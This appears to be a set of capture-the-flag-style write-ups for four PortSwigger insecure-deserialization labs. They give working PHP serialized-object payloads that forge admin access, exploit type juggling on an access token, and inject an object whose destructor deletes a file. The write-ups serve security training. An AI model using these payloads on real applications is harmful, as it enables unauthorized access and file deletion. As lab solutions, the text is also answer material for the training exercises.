## Modifying serialized objects

[Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)

Write-up:

1. Logging in sets a session cookie: `TzTzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d`

2. Base-64 decoding this gets us `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`
Altering the admin value to 1, re-encoding the cookie and changing it in the lab
gets us admin access. Accessing the admin panel allows us to delete user `carlos`
and solve the lab. 

## Modifying serialized data types

[Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)

Write-up:

1. Session cookie after login: `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ1NHRhNjMzdnNyM3p2NHVpYjdrYW92aTNta284NXVhOCI7fQ%3d%3d`. 

2. Base-64 decoding this gets us: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"u4ta633vsr3zv4uib7kaovi3mko85ua8";}`

3. Crafting the following payload, base-64 encoding it and setting session cookie gets us admin access and allows us to delete user `carlos` and solve the lab:

    `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}`

## Using application functionality to exploit insecure deserialization

[Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)

Write-up:

1. Decoded session cookie after login as `wiener:peter`: `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"sfe5z0dkqi5eq6k09qbpgak1z3gbn7x0";s:11:"avatar_link";s:19:"users/wiener/avatar";}`

2. We craft a payload to delete `morale.txt`: `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"sfe5z0dkqi5eq6k09qbpgak1z3gbn7x0";s:11:"avatar_link";s:10:"morale.txt";}`

3. Re-encoding it, setting as session cookie and deleting our account allows us to solve the lab.

## Arbitrary object injection in PHP

[Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)

Write-up:

1. Looking at the source code of `/my-account` we find the following: `<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->`
Attempting to use a GET request to get that file returns nothing. We can use the
hint given and access `libs/CustomTemplate.php~` to retrieve the source code.

    ```php
    <?php

    class CustomTemplate {
        private $template_file_path;
        private $lock_file_path;

        public function __construct($template_file_path) {
            $this->template_file_path = $template_file_path;
            $this->lock_file_path = $template_file_path . ".lock";
        }

        private function isTemplateLocked() {
            return file_exists($this->lock_file_path);
        }

        public function getTemplate() {
            return file_get_contents($this->template_file_path);
        }

        public function saveTemplate($template) {
            if (!isTemplateLocked()) {
                if (file_put_contents($this->lock_file_path, "") === false) {
                    throw new Exception("Could not write to " . $this->lock_file_path);
                }
                if (file_put_contents($this->template_file_path, $template) === false) {
                    throw new Exception("Could not write to " . $this->template_file_path);
                }
            }
        }

        function __destruct() {
            // Carlos thought this would be a good idea
            if (file_exists($this->lock_file_path)) {
                unlink($this->lock_file_path);
            }
        }
    }

    ?>
    ```

2. We can use the ``__destruct()`` function to solve the lab: 
`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`

    Setting the `lock_file_path` attribute to `/home/carlos/morale.txt` allows us to
    delete that file once the script is executed (by a GET request to `/libs/CustomTemplate.php`).

3. After base-64 and URL encoding (in that order) the object and setting it as the session cookie, we can make
the GET request to solve the lab:   `TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D`


